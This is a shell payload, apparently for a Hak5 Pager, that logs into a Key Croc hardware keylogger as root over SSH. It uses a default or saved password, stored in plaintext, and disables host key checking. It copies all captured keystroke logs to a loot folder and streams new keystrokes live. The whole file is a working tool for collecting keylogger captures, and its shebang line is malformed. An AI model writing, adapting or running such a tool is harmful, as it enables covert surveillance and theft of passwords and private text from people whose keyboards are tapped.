#!/usr/bin

# Title:  Pager_keystrokes
# Author: spywill
# Description: Read previous and live keystrokes from your Keycroc
# Version: 1.2

trap 'exit 0' INT TERM EXIT
remote_file="/root/loot/croc_char.log"
PASS_FILE="/mmc/root/payloads/user/remote_access/Pager_keystrokes/croc_passwd.txt"
CROC_IP_FILE="/mmc/root/payloads/user/remote_access/Pager_keystrokes/croc_IP.txt"
chmod 777 /mmc/root/payloads/user/remote_access/Pager_keystrokes
mkdir -p /root/loot/Croc_keystrokes
SAVE_KEYSTROKE="/root/loot/Croc_keystrokes/KeyCroc_Keystrokes.txt"

PROMPT "Title: Pager_keystrokes
Description: Read previous and live keystrokes from your Keycroc

sshpass is a requirement
Ensure that the Pager and Keycroc
are on the same local network

press any button to continue"

# Checking if SSHPASS is installed
if opkg list-installed | grep -q "sshpass"; then
	LOG yellow "Package SSHPASS is already installed."
	LOG ""
else
	ssh_pass=$(CONFIRMATION_DIALOG "Install SSHPASS")
	case "$ssh_pass" in
		$DUCKYSCRIPT_USER_CONFIRMED)
			LOG "User selected yes"
			spinnerid=$(START_SPINNER "Installing sshpass...")
			opkg update
			opkg -d mmc install sshpass
			STOP_SPINNER ${spinnerid}
			if opkg list-installed | grep -q "sshpass"; then
				LOG "SSHPASS has been installed."
			else
				LOG red "Error sshpass not in installed"
				exit 1
			fi
			;;
		$DUCKYSCRIPT_USER_DENIED)
			LOG "User selected no"
			exit 1
			;;
		*)
			LOG "Unknown response: $resp"
			exit 1
			;;
	esac
fi

# resolve croc.lan into IP
if ip_check=$(ping -c 1 -W 5 croc.lan 2>/dev/null); then
	ip=$(echo "$ip_check" | head -n1 | sed -n 's/.*(\([0-9.]*\)).*/\1/p')
	LOG yellow "croc.lan is up at $ip"
	croc_ip="$ip"
else
	LOG "croc.lan did not resolve"
	if [ -f "$CROC_IP_FILE" ]; then
		LOG "Croc IP file exists $CROC_IP_FILE"
		ip_check=$(cat "$CROC_IP_FILE")
	else
		LOG "Croc IP file missing or empty"
		ip_check=""
	fi
	croc_ip=$(IP_PICKER "Enter keycroc IP" "$ip_check")
	case $croc_ip in
	$DUCKYSCRIPT_CANCELLED)
		LOG "User cancelled"
		exit 1
		;;
	$DUCKYSCRIPT_REJECTED)
		LOG "Dialog rejected"
		exit 1
		;;
	$DUCKYSCRIPT_ERROR)
		LOG "An error occurred"
		exit 1
		;;
	esac
fi

echo "$croc_ip" > "$CROC_IP_FILE"
LOG "Saved Keycroc IP at $CROC_IP_FILE"

# Checking if key croc is reachability
can_reach() {
	host="$1"
	ping -c 1 -W 1 "$host" >/dev/null 2>&1 && return 0
	nc -z -w 2 "$host" 22 >/dev/null 2>&1
}

if can_reach $croc_ip; then
	LOG yellow "$croc_ip reachable"
	# Checking and save key croc password
	if [ -f "$PASS_FILE" ]; then
		LOG "Password file exists"
		default_pass=$(cat "$PASS_FILE")
	else
		LOG "Password file missing or empty"
		default_pass="hak5croc"
	fi
	croc_passwd=$(TEXT_PICKER "Enter Key croc password" "$default_pass")
	echo "$croc_passwd" > "$PASS_FILE"
	LOG "Saved Keycroc Password at $PASS_FILE"
else
	ALERT "$croc_ip unreachable"
	exit 1
fi

resp=$(CONFIRMATION_DIALOG "Start live keystrokes

Select the checkmark to continue.")
case "$resp" in
	$DUCKYSCRIPT_USER_CONFIRMED)
		LOG green "Previous keystrokes (croc_char.log)"
		spinnerid=$(START_SPINNER "Collecting keystroke...")
		OUTPUT=$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip "
		find / -type f -name 'croc_char.log' 2>/dev/null -exec sh -c '
		for file do
			chars=\$(wc -m < \"\$file\")
			echo \"File: \$file\"
			echo \"number of char: \$chars\"
			echo \"------------------------\"
			strings \"\$file\"
			echo
		done
		' sh {} +")
		echo "$OUTPUT" > $SAVE_KEYSTROKE
		LOG $(cat $SAVE_KEYSTROKE)
		STOP_SPINNER ${spinnerid}
		LOG yellow "Saved to $SAVE_KEYSTROKE"
		LOG blue "================================================="
		LOG green "Starting live keystrokes"
		sleep 1
		;;
	$DUCKYSCRIPT_USER_DENIED)
		LOG "User selected no"
		exit 1
		;;
	*)
		LOG "Unknown response: $resp"
		exit 1
		;;
esac

# Get remote file size
size=$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
	"stat -c %s '$remote_file' 2>/dev/null || echo 0")

# Start offset at last 10 bytes (never below 0)
offset=$(( size > 10 ? size - 10 : 0 ))

while true; do
	size=$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
		"stat -c %s '$remote_file' 2>/dev/null || echo 0")
    # Handle log truncation / rotation
	if (( size < offset )); then
		offset=$size
	fi
	if (( size > offset )); then
		sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
			"dd if='$remote_file' bs=1 skip=$offset count=$((size-offset)) 2>/dev/null" |
		while IFS= read -r -n1 char; do
			LOG "$char"
		done
		offset=$size
	fi
	sleep 0.1
done
